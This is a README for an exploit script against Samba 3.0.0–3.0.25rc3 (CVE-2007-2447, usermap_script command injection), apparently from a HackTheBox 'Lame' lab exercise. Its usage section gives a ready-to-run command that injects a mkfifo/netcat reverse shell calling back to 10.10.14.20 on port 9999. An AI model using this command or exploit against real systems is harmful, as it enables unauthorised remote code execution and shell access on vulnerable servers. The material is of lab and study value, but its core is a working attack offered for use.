# Samba 3.0.0 <= 3.0.25rc3 Command Injection

## Description:
The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.

## Usage:
```
python3 CVE-2007-2447_samba_usermap_rce.py --rhost 10.129.82.124 --rport 445 --command 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.20 9999 >/tmp/f'
```

## PoC:
![poc](./poc.png)
Exploit tested on hackthebox machine, [Lame](https://app.hackthebox.com/machines/Lame).<br>
Writeup: https://dugisan3rd.notion.site/Lame-d90d3ebf0dd14369bc7cf0ee8739822a?pvs=4

## References:
1. https://nvd.nist.gov/vuln/detail/CVE-2007-2447
2. https://www.exploit-db.com/exploits/16320